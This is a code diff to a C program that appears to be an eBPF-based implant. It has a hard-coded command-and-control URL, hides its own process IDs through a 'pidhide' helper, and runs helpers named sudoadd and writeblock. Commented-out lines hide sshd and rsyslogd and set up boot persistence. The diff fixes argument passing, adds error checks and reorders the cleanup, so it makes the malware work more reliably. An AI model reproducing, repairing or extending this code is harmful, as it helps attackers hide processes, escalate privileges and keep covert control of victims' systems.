@@ -17,6 +17,11 @@
 #include <jansson.h>
 
 
+#define BUFFER_SIZE 512
+#define COMMAND_SIZE 256
+#define PID_STR_SIZE 64
+
+
 const char *sbin_path = "/usr/sbin/";
 const char *username = "ebpfhelper";
 const char *base_url = "http://ebpf-cnc.surge.sh/";
@@ -41,8 +46,8 @@ pid_t run_task_and_hide(const char *cmd) {
         pid_t hide_pid = fork();
         if (hide_pid == 0) { // Child process for hiding the PID
             char hide_cmd[256];
-            snprintf(hide_cmd, sizeof(hide_cmd), "-p %d", pid);
-            execl("/usr/sbin/pidhide", hide_cmd, NULL);
+            snprintf(hide_cmd, sizeof(hide_cmd), "%d", pid);
+            execl("/usr/sbin/pidhide", "pidhide", "-p", hide_cmd, NULL);
             perror("execl"); // Executed only if execl fails
             exit(1);
         } else if (hide_pid < 0) { // Fork failed for hide_pid
@@ -76,8 +81,11 @@ void purge_directory(const char *dir_path) {
 }
 
 void find_pid_by_name(const char *program_name, int **found_pids) {
-    char command[256];
-    snprintf(command, sizeof(command), "pidof %s", program_name);
+    char command[COMMAND_SIZE];
+    if (snprintf(command, sizeof(command), "pidof %s", program_name) < 0) {
+        perror("snprintf");
+        exit(1);
+    }
 
     FILE *fp = popen(command, "r");
     if (!fp) {
@@ -85,11 +93,16 @@ void find_pid_by_name(const char *program_name, int **found_pids) {
         exit(1);
     }
 
-    char buffer[512];
-    if (fgets(buffer, sizeof(buffer), fp)) {
+    char buffer[BUFFER_SIZE] = {0};
+    if (fgets(buffer, sizeof(buffer) - 1, fp)) {
+        buffer[strcspn(buffer, "\n")] = 0;
         int pid_count = 0;
         for (char *token = strtok(buffer, " "); token; token = strtok(NULL, " ")) {
             *found_pids = realloc(*found_pids, (pid_count + 2) * sizeof(int));
+            if (!*found_pids) {
+                perror("realloc");
+                exit(1);
+            }
             (*found_pids)[pid_count++] = atoi(token);
         }
         (*found_pids)[pid_count] = -1;
@@ -338,6 +351,7 @@ void gather_system_info(char *data, size_t max_size) {
 
 void handle_sigint(int sig) {
     printf("\nPerforming shutdown task before exiting... \n");
+    remove("/tmp/btrfs.lock");  // Remove the lock file
 
     char *program_names[] = {"sudoadd", "pidhide", "writeblock"};
     int num_programs = sizeof(program_names) / sizeof(program_names[0]);
@@ -359,7 +373,6 @@ void handle_sigint(int sig) {
         free(found_pids);  // Free the memory
     }
 
-    remove("/tmp/btrfs.lock");  // Remove the lock file
 
     printf("Shutdown complete. Goodbye. \n");
     exit(0);
@@ -403,8 +416,8 @@ int main(int argc, char *argv[]) {
     //    }
     //}
 
-    const char *names[] = {argv[0], "sudo", "writeblocker", "sshd", "rsyslogd", "sudoadd"};
-    combine_and_hide_pids(names, sizeof(names) / sizeof(names[0]));
+    // const char *names[] = {argv[0], "sudo", "writeblocker", "sshd", "rsyslogd", "sudoadd"};
+    // combine_and_hide_pids(names, sizeof(names) / sizeof(names[0]));
 
     // Create the service make sure this program runs every boot after network connection established
     //create_and_enable_service();
